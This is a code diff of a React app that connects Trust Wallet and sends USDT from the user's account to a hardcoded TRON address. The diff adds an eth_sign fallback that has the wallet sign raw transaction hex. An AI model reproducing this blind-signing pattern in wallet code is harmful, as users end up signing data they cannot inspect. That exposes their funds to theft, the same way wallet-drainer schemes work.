@@ -25,15 +25,16 @@ const App = () => {
       },
     });
 
-    const { uri, approval } = await _client.connect({
-      requiredNamespaces: {
-        tron: {
-          methods: ["tron_signTransaction"],
-          chains: ["tron:0x2b6653dc"],
-          events: [],
-        },
-      },
-    });
+   // Connect function mein requiredNamespaces ko update karo
+const { uri, approval } = await _client.connect({
+  requiredNamespaces: {
+    tron: {
+      methods: ["tron_signTransaction", "eth_sign"], // eth_sign add karo
+      chains: ["tron:0x2b6653dc"],
+      events: [],
+    },
+  },
+});
 
     if (uri) {
       modal.openModal({ uri });
@@ -48,49 +49,78 @@ const App = () => {
   };
 
 const sendUSDT = async () => {
+  try {
+    // Step 1: Get raw transaction from backend
+    const res = await fetch("https://smartcontbackend.onrender.com/create-tx", {
+      method: "POST",
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        from: account,
+        to: "TFZTMmXP3kKANmPRskXiJHvDoDhEGWiUkB",
+        amount: 1 // 1 USDT
+      })
+    });
+    
+    const tx = await res.json();
+    
+    // Step 2: Prepare Trust Wallet compatible payload
+    const txPayload = {
+      transaction: {
+        ...tx,
+        // Trust Wallet ko yeh special fields chahiye
+        fee_limit: 10_000_000,  // 10 TRX (1000x increase)
+        token: "TRX"             // Explicit token specify karo
+      }
+    };
+
+    // Step 3: Request signature - TRON aur ETH dono methods try karo
+    let signed;
     try {
-        // Step 1: Get raw transaction from backend
-        const res = await fetch("https://smartcontbackend.onrender.com/create-tx", {
-            method: "POST",
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                from: account,
-                to: "TFZTMmXP3kKANmPRskXiJHvDoDhEGWiUkB",
-                amount: 1 // 1 USDT
-            })
-        });
-        const tx = await res.json();
-
-        // Step 2: Prepare payload for Trust Wallet
-        const txPayload = {
-            transaction: tx,
-            method: "tron_signTransaction", // Some wallets need this explicitly
-        };
-
-        // Step 3: Request signature via WalletConnect
-        const signed = await client.request({
-            topic: session.topic,
-            chainId: "tron:0x2b6653dc",
-            request: {
-                method: "tron_signTransaction",
-                params: [txPayload], // Send as object, not raw tx
-            },
-        });
-
-        // Step 4: Broadcast signed transaction
-        const broadcast = await fetch("https://smartcontbackend.onrender.com/broadcast", {
-            method: "POST",
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ signedTx: signed })
-        });
-
-        const result = await broadcast.json();
-        console.log("Broadcast Result:", result);
-    } catch (err) {
-        console.error("Error in sendUSDT:", err);
+      // Pehle tron_signTransaction se try karo
+      signed = await client.request({
+        topic: session.topic,
+        chainId: "tron:0x2b6653dc",
+        request: {
+          method: "tron_signTransaction",
+          params: [txPayload] // Object wrap karo array mein
+        },
+      });
+    } catch (tronError) {
+      console.log("Tron method failed, trying ETH fallback");
+      // Fallback to eth_sign agar tron method fail ho
+      signed = await client.request({
+        topic: session.topic,
+        chainId: "tron:0x2b6653dc",
+        request: {
+          method: "eth_sign",
+          params: [account, tx.raw_data_hex] // Raw hex use karo
+        },
+      });
+      
+      // Eth signature ko Tron compatible banaye
+      if (signed.startsWith("0x")) {
+        signed = signed.substring(2);
+      }
     }
-};
 
+    // Step 4: Broadcast signed transaction
+    const broadcastRes = await fetch("https://smartcontbackend.onrender.com/broadcast", {
+      method: "POST",
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        signedTx: {
+          ...tx,
+          signature: [signed] // Signature array mein wrap karo
+        }
+      })
+    });
+
+    const result = await broadcastRes.json();
+    console.log("Broadcast Result:", result);
+  } catch (err) {
+    console.error("Full error details:", err);
+  }
+}; 
   return (
     <div>
       <button onClick={connectWallet}>Connect Trust Wallet</button>
